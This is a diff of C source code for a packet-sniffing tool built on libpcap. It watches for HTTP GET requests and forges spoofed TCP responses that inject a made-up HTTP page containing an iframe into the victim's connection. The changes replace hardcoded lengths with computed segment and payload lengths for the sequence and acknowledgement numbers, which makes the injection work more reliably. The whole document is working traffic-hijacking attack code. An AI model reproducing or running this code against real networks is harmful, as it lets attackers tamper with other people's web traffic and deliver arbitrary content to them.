@@ -132,7 +132,7 @@ char payload_METHOD_buffer[10];
 //char HOST_buffer[100];
 
 int i,cmp1;
-int segmentSize;
+int segmentSize,fakepayload_len;
 u_int32 first_seq,secound_seq,third_seq;
 
 
@@ -177,7 +177,6 @@ while(1){
 
    //这里要注意结构体里有两个长度值
    //http://stackoverflow.com/questions/1491660/pcap-struct-pcap-pkthdr-len-vs-caplen
-  segmentSize=pkthdr.caplen;
 
 	ethernet = (struct sniff_ethernet*)(packet);
 	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
@@ -195,6 +194,8 @@ while(1){
 
 
 	payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+  //TCP packect SIZE === ip_len - ipheader's size and tcpheader's size
+  segmentSize=g_ntohs(ip->ip_len)-size_tcp-size_ip;
 
   	//GET / HTTP
  	for(i=0;i<10;i++){
@@ -221,22 +222,18 @@ while(1){
       printf("   SEQ: %u\n", g_ntohl(tcp->th_seq) );
       printf("   SRC PORT: %d\n", ntohs(tcp->th_sport) );
       printf("   DST PORT: %d\n", ntohs(tcp->th_dport) );
+      printf("   Len: %d\n",segmentSize);
 
       //假包的seq=th_ack，ack=seq+packect.length大小...
-      //这么构建似乎也有问题
-      //看来得发三次包：第一次空,ACK，第二次内容，PUSH+ACK，第三次，ACK？
-      //有待实验
-      printf("seq+segmentSize:%u,%u\n",g_ntohl(tcp->th_seq),segmentSize);
-      
       //具体的分析见5step.md
       //Fake_send(包的seq,包的ack，包的内容,包的标志位，包的源地址,包的目的地址，包的源端口，包的目的端口)
-      request_seqPlusLength=g_htonl(g_ntohl(tcp->th_seq)+467);
-      
+      request_seqPlusLength=g_htonl(g_ntohl(tcp->th_seq)+segmentSize);
       html_content="HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Tue, 29 Jan 2013 04:42:24 GMT\r\nContent-Type: text/html\r\nContent-Length:5946\r\nLast-Modified: Tue, 29 Jan 2013 04:42:01 GMT\r\nConnection: keep-alive\r\nAccept-Ranges: bytes\r\n\r\n<html><head><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache,must-revalidate'></head><body><h1>hhhhhhhhhhhh</h1><iframe width='1000' border='0' height='700' src='http://www.baidu.com/'></iframe></body></html>\n";     
+     fakepayload_len=strlen(html_content);
 
      first_seq   = tcp->th_ack;
      secound_seq = tcp->th_ack;
-     third_seq   = g_htonl(g_ntohl(secound_seq)+465);
+     third_seq   = g_htonl(g_ntohl(secound_seq)+fakepayload_len);
 
 //Fake_send(first_seq   ,request_seqPlusLength,""          ,TH_ACK          ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
 Fake_send(secound_seq ,request_seqPlusLength,html_content,TH_ACK|TH_PUSH  ,ip->ip_id,ip->ip_off,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
